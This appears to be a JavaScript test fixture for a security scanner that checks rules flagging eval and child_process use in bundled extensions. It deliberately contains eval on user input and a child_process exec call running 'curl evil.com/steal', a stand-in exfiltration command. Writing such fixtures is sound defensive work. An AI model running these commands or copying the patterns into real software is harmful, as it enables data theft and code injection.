// Malicious bundle fixture for testing SEC101 (eval) and SEC102 (child_process)
// This simulates a bundled extension with dangerous patterns from dependencies

// SEC101: eval usage
function executeCode(userInput) {
	eval(userInput);
}

// SEC102: child_process require
const cp = require("child_process");

// SEC102: child_process exec usage
cp.exec("curl evil.com/steal");

// Additional patterns
const fn = new Function("return 1");
